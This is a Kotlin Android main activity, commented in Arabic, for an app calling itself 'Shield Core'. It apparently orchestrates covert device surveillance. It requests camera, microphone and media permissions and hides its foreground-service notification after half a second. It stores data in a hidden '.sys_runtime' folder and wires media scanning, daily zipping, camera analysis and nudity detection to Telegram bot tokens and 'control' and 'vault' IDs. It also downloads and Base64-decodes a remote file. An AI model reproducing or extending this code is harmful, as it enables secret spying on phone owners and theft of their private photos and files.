package com.example.app

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.ProgressBar
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * النشاط الرئيسي للتطبيق (بديل main.py)
 * 
 * يقوم بـ:
 * 1. طلب الأذونات الديناميكية حسب إصدار Android.
 * 2. إنشاء مجلدات التشغيل (.sys_runtime).
 * 3. تشغيل خدمة الإشعارات الخلفية (ForegroundService).
 * 4. طلب تجاوز تحسين البطارية.
 * 5. التحقق من وجود نموذج AI، وتحميله ديناميكياً عبر FileDownloader مع عرض التقدم في ProgressBar.
 * 6. تحميل الإعدادات من ConfigLoader.
 * 7. تشغيل Monitor و TelegramUi.
 * 8. عرض تقرير حالة التطبيق بشكل منظم على الشاشة.
 * 
 * ✅ تم استبدال الإشعار العادي بخدمة أمامية حقيقية (ForegroundService).
 * ✅ الإشعار يظهر لمدة 0.5 ثانية فقط ثم يختفي نهائياً، مع بقاء الخدمة تعمل في الخلفية.
 * ✅ تم تحسين السجل بعرض تفاصيل دقيقة عن العمليات (نجاح/فشل مع تحديد الموقع).
 * ✅ تمت إضافة زر لحذف بيانات التطبيق يدوياً أثناء الاختبار.
 * ✅ تم إيقاف الخدمات (TelegramUi و Monitor) قبل حذف بيانات التطبيق.
 * ✅ تم تحرير المفتاح المؤقت من SecurityHelper عند تدمير النشاط.
 * ✅ تم إضافة mediaScanner.close() في onDestroy لمنع تسريب الذاكرة.
 */
class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        const val APP_VERSION = "4.2.1"
    }

    private lateinit var logEditText: EditText
    private lateinit var progressBar: ProgressBar
    private lateinit var runtimeDir: File
    private lateinit var modelsDir: File

    // مرجع لكائن TelegramUi لعرض الحالة
    private var telegramUi: TelegramUi? = null

    // ✅ متغير عام لـ MediaScanner لتحريره عند تدمير النشاط
    private var mediaScanner: MediaScanner? = null

    // حالة تقدم تحميل النموذج (0-100)
    private val _progressState = MutableStateFlow(0)
    val progressState = _progressState.asStateFlow()

    // مسجل طلب الأذونات المتعددة
    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val grantedCount = permissions.count { it.value }
            appendLog("🔄 نتائج الأذونات: تم منح $grantedCount من أصل ${permissions.size}")
            // إعادة تهيئة النظام بعد الاستجابة للأذونات
            lifecycleScope.launch(Dispatchers.IO) {
                initCoreAsync()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // ربط عناصر الواجهة
        logEditText = findViewById(R.id.logEditText)
        progressBar = findViewById(R.id.progressBar)
        val btnPermissions: Button = findViewById(R.id.btnPermissions)
        val btnCopy: Button = findViewById(R.id.btnCopy)
        val btnClear: Button = findViewById(R.id.btnClear)
        val btnClearData: Button = findViewById(R.id.btnClearData)  // ✅ زر تنظيف البيانات

        // إعدادات ProgressBar
        progressBar.max = 100
        progressBar.progress = 0
        progressBar.visibility = View.GONE

        logEditText.setText("=== Shield Core v4.2 Diagnostic Panel (Kotlin) ===\n")

        // تعيين مستمعي الأزرار
        btnPermissions.setOnClickListener { requestAllPermissions() }
        btnCopy.setOnClickListener { copyLogToClipboard() }
        btnClear.setOnClickListener { logEditText.setText("=== تم إعادة ضبط السجل ===\n") }
        btnClearData.setOnClickListener { clearAppData() }  // ✅ ربط زر التنظيف

        // مراقبة التقدم لتحديث الواجهة
        lifecycleScope.launch(Dispatchers.Main) {
            progressState.collect { progress ->
                if (progress > 0 && progress < 100) {
                    progressBar.visibility = View.VISIBLE
                    progressBar.progress = progress
                    appendLog("📥 تقدم التحميل: $progress%")
                } else if (progress >= 100) {
                    progressBar.progress = 100
                    progressBar.visibility = View.GONE
                    appendLog("✅ اكتمل تحميل النموذج بنجاح.")
                } else {
                    progressBar.visibility = View.GONE
                }
            }
        }

        // بدء التهيئة بعد 0.5 ثانية
        lifecycleScope.launch(Dispatchers.IO) {
            delay(500)
            initCoreAsync()
        }

        // فتح إعدادات الإشعارات بعد ثانيتين (محاكاة للدالة الأصلية)
        lifecycleScope.launch(Dispatchers.Main) {
            delay(2000)
            openNotificationSettings()
        }
    }

    // ==================== دوال السجل (Logging) ====================

    /**
     * إضافة رسالة إلى السجل مع طابع زمني دقيق (مللي ثانية).
     * كل رسالة في سطر منفصل لضمان العرض العمودي.
     */
    private fun appendLog(text: String) {
        runOnUiThread {
            val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
            logEditText.append("[$timestamp] $text\n")
            logEditText.setSelection(logEditText.text.length) // تمرير تلقائي للأسفل
        }
    }

    private fun copyLogToClipboard() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("ShieldCore_Logs", logEditText.text.toString())
        clipboard.setPrimaryClip(clip)
        appendLog("✅ تم نسخ السجلات إلى الحافظة بنجاح.")
    }

    // ==================== عرض تقرير الحالة ====================

    /**
     * عرض تقرير حالة التطبيق بشكل منظم على الشاشة (عمودي).
     */
    private fun displayStatusReport() {
        val ui = telegramUi
        if (ui == null) {
            appendLog("⚠️ لا يمكن عرض التقرير: TelegramUi غير مهيأ.")
            return
        }

        val status = ui.getStatus()
        val running = if (status["running"] == true) "🟢 يعمل" else "🔴 متوقف"

        appendLog("")
        appendLog("════════════════════════════════════")
        appendLog("   📊 تقرير حالة التطبيق")
        appendLog("════════════════════════════════════")
        appendLog("🔹 التوكنات النشطة       : ${status["active_tokens"]}")
        appendLog("🔹 التوكنات الاحتياطية   : ${status["reserve_tokens"]}")
        appendLog("🔹 الأجهزة المسجلة       : ${status["devices"]}")
        appendLog("🔹 الجلسات النشطة        : ${status["sessions"]}")
        appendLog("🔹 طلبات API             : ${status["api_calls"]}")
        appendLog("🔹 فشل API               : ${status["api_failures"]}")
        appendLog("🔹 ملفات معلقة           : ${status["pending_files"]}")
        appendLog("🔹 حالة التشغيل          : $running")
        appendLog("════════════════════════════════════")
        appendLog("")
    }

    // ============================================================
    //  التهيئة الأساسية (مع رسائل سجل مفصلة)
    // ============================================================

    private suspend fun initCoreAsync() {
        appendLog("🚀 بدء الفحوصات التشخيصية للنظام...")

        // 1. إعداد المجلدات والتنظيف
        appendLog("⚙️ الخطوة 1/5: إعداد بيئة التشغيل والمجلدات...")
        try {
            setupDirectories()
            appendLog("✅ [OK] تم إعداد المجلدات بنجاح.")
        } catch (e: Exception) {
            appendLog("❌ [ERROR] فشل إعداد المجلدات: ${e.message} (في MainActivity.setupDirectories)")
            return
        }

        // 2. الأذونات والخدمة الأمامية
        appendLog("🔓 الخطوة 2/5: التحقق من الأذونات وتشغيل الإشعارات...")
        withContext(Dispatchers.Main) {
            requestAllPermissions()
        }
        try {
            startSilentForegroundService()
            appendLog("✅ [OK] تم تشغيل الخدمة الخلفية (سيختفي الإشعار بعد 0.5 ثانية).")
        } catch (e: Exception) {
            appendLog("⚠️ [WARNING] فشل تشغيل الخدمة الخلفية: ${e.message} (MainActivity.startSilentForegroundService)")
        }
        requestBatteryOptimizationExemption()

        // 3. التحقق من نموذج AI
        appendLog("🧠 الخطوة 3/5: التحقق من ملف نموذج AI (engine_v2.tflite)...")
        try {
            val modelReady = ensureModelReady()
            if (modelReady) {
                appendLog("✅ [OK] نموذج AI جاهز ويعمل بنجاح.")
            } else {
                appendLog("⚠️ [WARNING] نموذج AI غير متوفر حالياً، سيتم تفعيله فور اكتمال التحميل في الخلفية.")
            }
        } catch (e: Exception) {
            appendLog("❌ [ERROR] فشل التحقق من النموذج: ${e.message} (MainActivity.ensureModelReady)")
        }

        // 4. تحميل الإعدادات والتوكنات
        appendLog("🔑 الخطوة 4/5: تحميل الإعدادات وتوكنات تلغرام...")
        try {
            val config = ConfigLoader.load(this@MainActivity)
            appendLog("✅ [OK] التوكنات المحملة: النشطة (${config.activeTokens.size}), الاحتياطية (${config.reserveTokens.size})")
            appendLog("   • معرف التحكم: ${config.controlId} | معرف الخزنة: ${config.vaultId}")
            // 🔧 التصحيح: استبدال الشرط غير الصحيح بـ isNotBlank()
            appendLog("   • المفتاح السري: ${if (config.secret.isNotBlank()) "✅ مفعل ومشفّر" else "⚠️ غير محدد"}")

            // 5. تهيئة المراقب والمكونات
            appendLog("🧩 الخطوة 5/5: تهيئة وحدة المراقبة والمكونات المرتبطة...")
            val monitor = Monitor.getInstance(this@MainActivity)
            appendLog("   • الجهاز المسجل: ${monitor.deviceModel} (${monitor.deviceId})")

            // إنشاء المكونات
            val nudeDetector = NudeDetector.create(this@MainActivity, monitor)
            appendLog("   • NudeDetector: ${if (nudeDetector.isReady()) "✅ جاهز" else "⏳ قيد التحميل"}")

            val cameraAnalyzer = CameraAnalyzer.create(this@MainActivity, monitor, nudeDetector)
            appendLog("   • CameraAnalyzer: تم إنشاؤه")

            telegramUi = TelegramUi(
                context = this@MainActivity,
                monitor = monitor,
                config = config
            )
            val ui = telegramUi!!
            appendLog("   • TelegramUi: تم إنشاؤه مع ${config.activeTokens.size} توكنات نشطة")

            // ✅ تعديل: تعيين mediaScanner كمتغير عام لتوفير إمكانية إغلاقه في onDestroy
            mediaScanner = MediaScanner.create(this@MainActivity, monitor, ui)
            appendLog("   • MediaScanner: تم إنشاؤه")

            val dailyZipper = DailyZipper.create(this@MainActivity, mediaScanner, ui)
            appendLog("   • DailyZipper: تم إنشاؤه")

            // ربط المكونات
            monitor.ui = ui
            monitor.ctrl = config.controlId
            monitor.vlt = config.vaultId
            monitor.cameraAnalyzer = cameraAnalyzer
            monitor.mediaScanner = mediaScanner
            monitor.dailyZipper = dailyZipper
            monitor.nudeDetector = nudeDetector
            appendLog("   • تم ربط جميع المكونات بـ Monitor")

            // تشغيل الخدمات
            appendLog("📡 بدء استماع وحدة المراقبة واختبار الواجهة...")
            ui.start()
            monitor.start()
            appendLog("✅ [OK] TelegramUi و Monitor يعملان بنجاح.")

            displayStatusReport()
            appendLog("🎉 جميع الأنظمة تعمل بنجاح! التطبيق جاهز للأوامر.")

        } catch (e: Exception) {
            Log.e(TAG, "Initialization Error", e)
            appendLog("💥 [ERROR] خطأ غير متوقع أثناء التهيئة: ${e.message}")
            val stack = e.stackTrace.firstOrNull()
            if (stack != null) {
                appendLog("   • الموقع: ${stack.className}::${stack.methodName} (السطر ${stack.lineNumber})")
            }
        }
    }

    // ==================== إعداد المجلدات ====================

    private fun setupDirectories() {
        runtimeDir = File(filesDir, ".sys_runtime")
        val versionFile = File(runtimeDir, "version.txt")

        if (runtimeDir.exists()) {
            val oldVersion = if (versionFile.exists()) versionFile.readText().trim() else ""
            if (oldVersion != APP_VERSION) {
                runtimeDir.deleteRecursively()
                appendLog("🧹 تم تنظيف ملفات التشغيل القديمة (الإصدار السابق: v$oldVersion)")
            }
        }

        runtimeDir.mkdirs()
        versionFile.writeText(APP_VERSION)

        // إنشاء المجلدات الفرعية
        File(runtimeDir, "updates").mkdirs()
        File(runtimeDir, ".cache_thumb").mkdirs()
        modelsDir = File(runtimeDir, "models").apply { mkdirs() }
    }

    // ==================== الأذونات الديناميكية ====================

    private fun requestAllPermissions() {
        val permissionsNeeded = mutableListOf(
            Manifest.permission.INTERNET,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO)
            permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // Android 10+
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        } else { // Android 9-
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        val missing = permissionsNeeded.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            appendLog("⚠️ جاري طلب ${missing.size} أذونات مفقودة...")
            requestPermissionLauncher.launch(missing.toTypedArray())
        } else {
            appendLog("✅ جميع الأذونات المسموح بها ممنوحة.")
        }
    }

    // ============================================================
    //  الخدمة الخلفية الصامتة (Foreground Service)
    // ============================================================

    /**
     * تشغيل الخدمة الخلفية الصامتة (يظهر الإشعار 0.5 ثانية فقط)
     * يتم استدعاء ForegroundService الذي يدير الإشعار بنفسه.
     */
    private fun startSilentForegroundService() {
        try {
            val serviceIntent = Intent(this, ForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            appendLog("✅ تم تشغيل الخدمة الخلفية (سيختفي الإشعار بعد 0.5 ثانية).")
        } catch (e: Exception) {
            appendLog("⚠️ فشل تشغيل الخدمة الخلفية: ${e.localizedMessage}")
        }
    }

    // ==================== تنظيف بيانات التطبيق ====================

    /**
     * حذف جميع بيانات التطبيق (مجلد .sys_runtime) يدوياً.
     * مفيد أثناء مرحلة الاختبار لتجنب تراكم الملفات.
     * ✅ تم إيقاف TelegramUi و Monitor قبل الحذف لتجنب تعارضات الملفات المفتوحة.
     */
    private fun clearAppData() {
        try {
            // 1. إيقاف TelegramUi
            telegramUi?.stop()
            telegramUi = null
            appendLog("🛑 تم إيقاف TelegramUi.")

            // 2. إيقاف Monitor (باستخدام المفرد)
            try {
                Monitor.getInstance(this).stop()
                appendLog("🛑 تم إيقاف Monitor.")
            } catch (e: Exception) {
                appendLog("⚠️ فشل إيقاف Monitor: ${e.message}")
            }

            // 3. حذف مجلد .sys_runtime
            val runtimeDir = File(filesDir, ".sys_runtime")
            if (runtimeDir.exists()) {
                runtimeDir.deleteRecursively()
                appendLog("🧹 تم حذف جميع بيانات التطبيق بنجاح (مجلد .sys_runtime).")
            } else {
                appendLog("ℹ️ لا توجد بيانات للتطبيق لحذفها.")
            }

            // 4. إعادة إنشاء المجلدات الأساسية
            setupDirectories()
            appendLog("🔄 تم إعادة إنشاء المجلدات الأساسية.")

            // 5. إعادة تهيئة النظام (اختياري - يمكن للمستخدم إعادة التشغيل يدوياً)
            // لكننا لا نعيد التهيئة تلقائياً لتجنب التعقيد، ونترك المستخدم يضغط على زر PERMISSIONS لإعادة التشغيل.

        } catch (e: Exception) {
            appendLog("❌ فشل حذف البيانات: ${e.message}")
        }
    }

    // ==================== تجاوز تحسين البطارية ====================

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    appendLog("⚠️ تعذر طلب استثناء البطارية: ${e.localizedMessage}")
                }
            }
        }
    }

    // ==================== فتح إعدادات الإشعارات ====================

    private fun openNotificationSettings() {
        try {
            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, packageName)
            }
            startActivity(intent)
        } catch (e: Exception) {
            appendLog("⚠️ تعذر فتح إعدادات الإشعارات: ${e.localizedMessage}")
        }
    }

    // ==================== إدارة نموذج AI مع Progress ====================

    private fun updateProgress(progress: Int) {
        _progressState.value = progress.coerceIn(0, 100)
    }

    /**
     * التأكد من جاهزية نموذج AI.
     * إذا كان النموذج موجوداً وكبيراً بما يكفي، يعيد true.
     * وإلا، يحاول تحميله من الإنترنت عبر FileDownloader مع إعادة المحاولة وعرض التقدم.
     * بعد التحميل، يتحقق من كون الملف نصياً (Base64) ويفك تشفيره إذا لزم الأمر.
     */
    private suspend fun ensureModelReady(): Boolean {
        val modelFile = File(modelsDir, "engine_v2.tflite")
        val minSize = 1_000_000L // 1 ميجابايت كحد أدنى

        // 1. إذا كان الملف موجوداً وكبيراً بما يكفي، اعتبره جاهزاً
        if (modelFile.exists() && modelFile.length() >= minSize) {
            appendLog("✅ نموذج AI موجود مسبقاً (${modelFile.length() / (1024 * 1024)} ميجابايت).")
            updateProgress(100)
            return true
        }

        // 2. محاولة نسخ النموذج من مجلد assets (إذا كان موجوداً)
        try {
            appendLog("📂 محاولة نسخ النموذج من assets...")
            updateProgress(10)
            assets.open("engine_v2.tflite").use { input ->
                modelFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }
            if (modelFile.exists() && modelFile.length() >= minSize) {
                appendLog("✅ تم نسخ النموذج من assets بنجاح (${modelFile.length() / (1024 * 1024)} ميجابايت).")
                updateProgress(100)
                return true
            }
        } catch (e: Exception) {
            appendLog("⚠️ لم يتم العثور على النموذج في مجلد assets: ${e.localizedMessage}")
        }

        // 3. إذا لم ينجح النسخ، نبدأ التحميل من الإنترنت مع Progress
        appendLog("📥 بدء تحميل النموذج من الإنترنت (قد يستغرق عدة دقائق)...")
        updateProgress(5)

        // قراءة ملف index.json من assets للحصول على رابط التحميل وحجم الملف المتوقع
        val indexJson = try {
            assets.open("index.json").bufferedReader().use { it.readText() }
        } catch (e: Exception) {
            appendLog("❌ فشل قراءة ملف index.json: ${e.localizedMessage}")
            updateProgress(0)
            return false
        }

        val json = JSONObject(indexJson)
        val assetsArray = json.getJSONArray("assets")
        if (assetsArray.length() == 0) {
            appendLog("❌ لا توجد أصول في index.json")
            updateProgress(0)
            return false
        }

        val asset = assetsArray.getJSONObject(0)
        val url = asset.getString("url")
        val expectedSize = asset.optLong("expected_size", 0)

        if (url.isEmpty()) {
            appendLog("❌ رابط التحميل غير موجود في index.json")
            updateProgress(0)
            return false
        }

        appendLog("🌐 رابط التحميل: $url")
        if (expectedSize > 0) {
            appendLog("📦 الحجم المتوقع: ${expectedSize / (1024 * 1024)} ميجابايت")
        } else {
            appendLog("⚠️ الحجم المتوقع غير محدد، سيتم التحقق من سلامة الملف لاحقاً.")
        }

        // استخدام FileDownloader لتحميل النموذج مع إعادة المحاولة
        val downloader = FileDownloader(this)

        // بدء تحميل حقيقي في الخلفية
        val success = withContext(Dispatchers.IO) {
            downloader.downloadModelWithRetry(
                url = url,
                destinationFile = modelFile,
                expectedSize = expectedSize,
                maxRetries = 3
            )
        }

        // ✅ التحقق من الملف بعد التحميل (حتى لو فشل التحميل، قد يكون الملف موجوداً جزئياً)
        if (success && modelFile.exists()) {
            // ✅ التحقق مما إذا كان الملف نصياً (Base64) بدلاً من باينري
            try {
                val firstBytes = ByteArray(10)
                java.io.FileInputStream(modelFile).use { it.read(firstBytes) }
                val header = String(firstBytes, Charsets.UTF_8)
                // إذا كان المحتوى يبدو كنص Base64 (شائع في ملفات .txt على GitHub)
                if (header.matches(Regex("^[A-Za-z0-9+/=\\s]+$"))) {
                    appendLog("🔄 الملف نصي (Base64)، جاري فك التشفير...")
                    val text = modelFile.readText(Charsets.UTF_8).replace("\\s".toRegex(), "")
                    val decoded = android.util.Base64.decode(text, android.util.Base64.NO_WRAP)
                    java.io.FileOutputStream(modelFile).use { it.write(decoded) }
                    appendLog("✅ تم فك تشفير الملف بنجاح (الحجم: ${modelFile.length()} بايت).")
                } else {
                    appendLog("✅ الملف باينري مباشر، لا حاجة لفك تشفير.")
                }
            } catch (e: Exception) {
                appendLog("⚠️ فشل التحقق من نوع الملف: ${e.message}")
            }
        }

        if (success && modelFile.exists() && modelFile.length() >= minSize) {
            appendLog("✅ تم تحميل النموذج بنجاح (${modelFile.length() / (1024 * 1024)} ميجابايت).")
            updateProgress(100)
            return true
        } else {
            appendLog("❌ فشل تحميل النموذج بعد عدة محاولات، أو الملف تالف.")
            updateProgress(0)
            // حذف الملف التالف إن وجد
            if (modelFile.exists()) modelFile.delete()
            return false
        }
    }

    // ==================== دورة الحياة ====================

    override fun onDestroy() {
        super.onDestroy()
        
        // ✅ 1. إيقاف TelegramUi
        telegramUi?.stop()
        telegramUi = null
        appendLog("🛑 تم إيقاف TelegramUi.")

        // ✅ 2. إغلاق وتحرير MediaScanner (إيقاف ContentObserver وإغلاق قاعدة البيانات)
        try {
            mediaScanner?.close()
            mediaScanner = null
            appendLog("🧹 تم إغلاق MediaScanner وتحرير موارده.")
        } catch (e: Exception) {
            appendLog("⚠️ فشل إغلاق MediaScanner: ${e.message}")
        }

        // ✅ 3. إيقاف Monitor
        try {
            Monitor.getInstance(this).stop()
            appendLog("🛑 تم إيقاف Monitor.")
        } catch (e: Exception) {
            appendLog("⚠️ فشل إيقاف Monitor: ${e.message}")
        }

        // ✅ 4. تنظيف المفتاح المؤقت من SecurityHelper (مسح الذاكرة المؤقتة)
        SecurityHelper.cleanup()
        // يمكن أيضاً استخدام clearCachedKey() إذا كانت cleanup() غير مرغوبة:
        // SecurityHelper.clearCachedKey()
        appendLog("🧹 تم مسح المفتاح المؤقت من SecurityHelper.")

        // ✅ 5. طباعة تأكيد تحرير الموارد
        appendLog("✅ تم إيقاف التطبيق وتحرير جميع الموارد.")
    }
}
